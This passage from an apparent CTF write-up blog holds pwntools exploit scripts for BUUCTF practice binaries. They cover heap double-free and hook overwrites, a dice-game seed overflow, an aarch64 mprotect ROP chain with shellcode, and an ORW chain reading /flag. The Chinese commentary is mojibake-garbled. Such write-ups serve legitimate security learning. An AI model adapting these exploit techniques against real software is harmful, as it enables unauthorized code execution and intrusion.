class="hljs-string">&#x27;cccc&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;haha&#x27;</span>)<span class="hljs-comment">#1</span><br>show()<br>main_arena_beside=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(main_arena_beside)<br>base=main_arena_beside-<span class="hljs-number">88</span>-<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-comment">#----------------------------------------------------------------</span><br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;hahaha&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(og)+p64(realloc+<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="å¤§äºŒä¸Š">å¤§äºŒä¸Š</h2><h3 id="qctf-2018-dice-game">qctf_2018_dice_game</h3><p>æº¢å‡º,æ§åˆ¶seedå€¼ï¼Œä½¿ä¼ªéšæœºä¸ºå›ºå®šå€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 50</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">( <span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> number[MAX] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> i;<br>srand(<span class="hljs-number">0</span>); <span class="hljs-comment">/*æ’­ç§å­*/</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; MAX; i++)&#123;<br>number[i] = rand() % <span class="hljs-number">6</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&#x27;%d&#x27;,&quot;</span>, number[i]+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./QCTF_2018_dice_game&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29426</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0</span>))<br>a=[<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    r.recvuntil(<span class="hljs-string">&#x27;Give me the point(1~6): &#x27;</span>)<br>    r.sendline(a[i])<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2">xm_2019_awd_pwn2</h3><p>è¿™é¢˜é™åˆ¶æœ€å¤šåˆ›å»º18ä¸ªå †ï¼Œlibc2.27åŠ äº†doublefreeæ£€æµ‹çš„è¯ï¼Œç”¨fastbin_attackï¼Œå°±å·®ä¸€ä¸ªå †å°±å¯ä»¥åšå‡ºæ¥ï¼Œï¼ˆä¸çŸ¥æ˜¯ä¸æ˜¯awdï¼Œè¢«ä¿®è¿‡ï¼‰è€Œbuuçš„è¿œç«¯æ˜¯è€ç‰ˆæœ¬æ²¡æœ‰doublefreeæ£€æµ‹ï¼Œç”¨tcache doublefreeå°±å¯ä»¥è§£å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./xm_2019_awd_pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>malloc_hook=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#9</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i+<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#15</span><br>add(<span class="hljs-number">0x68</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<span class="hljs-comment">#16</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#18</span><br><span class="hljs-comment">#add(0x68,&#x27;&#x27;)#19</span><br>debug()<br><br>r.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./xm_2019_awd_pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25368</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>malloc_hook=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>,p64(free_hook))<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="shanghai2018-baby-arm">shanghai2018_baby_arm</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>])<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28119)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.binary = <span class="hljs-string">&quot;./pwn&quot;</span><br>shell=asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;Name:&#x27;</span>,shell)<br>payload=cyclic(<span class="hljs-number">72</span>)+p64(<span class="hljs-number">0x411068</span>)<br>r.sendline(payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>æ ˆæº¢å‡ºï¼Œç„¶ååˆ©ç”¨scuçš„ROPgadgetè¿›è¡Œropï¼Œç”¨mprotectææƒbssæ®µï¼Œåæ‰§è¡Œbssæ®µçš„shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>])<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28119)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.binary = <span class="hljs-string">&quot;./pwn&quot;</span><br>shell=p64(elf.plt[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;Name:&#x27;</span>,shell)<br><span class="hljs-comment">#----------------------------</span><br>csu_down=<span class="hljs-number">0x4008CC</span><br>csu_up=<span class="hljs-number">0x4008AC</span><br>mprotect_addr=<span class="hljs-number">0x411068</span><br>shell_addr=<span class="hljs-number">0x411068</span>+<span class="hljs-number">8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu_rop</span>(<span class="hljs-params">fun,v1,v2,v3</span>):<br>    csu_down=<span class="hljs-number">0x4008CC</span><br>    csu_up=<span class="hljs-number">0x4008AC</span><br>    payload=p64(csu_down)+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(csu_up)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>    payload+=p64(fun)+p64(v3)+p64(v2)+p64(v1)<br>    <span class="hljs-keyword">return</span> payload<br>payload=cyclic(<span class="hljs-number">72</span>)+csu_rop(mprotect_addr,shell_addr,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>)+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(shell_addr)<br><br>r.sendline(payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="0CTF-2016-warmup">0CTF_2016_warmup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./warmup&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26363</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>main_addr=<span class="hljs-number">0x0804815A</span><br>write_addr=<span class="hljs-number">0x08048135</span><br>read_addr=<span class="hljs-number">0x0804811D</span><br>alarm_addr=<span class="hljs-number">0x0804810D</span><br>data=<span class="hljs-number">0x080491BC</span><br>syscall=<span class="hljs-number">0x08048122</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read_addr)+p32(main_addr)+p32(<span class="hljs-number">0</span>)+p32(data)+p32(<span class="hljs-number">0x8</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>sleep(<span class="hljs-number">0xa</span>-<span class="hljs-number">0x5</span>)<br><span class="hljs-comment">#-------------------------------orw----------------------------------</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(alarm_addr)+p32(syscall)+p32(main_addr)+p32(data)+p32(<span class="hljs-number">0</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read_addr)+p32(main_addr)+p32(<span class="hljs-number">3</span>)+p32(data)+p32(<span class="hljs-number">0x30</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(write_addr)+p32(main_addr)+p32(<span 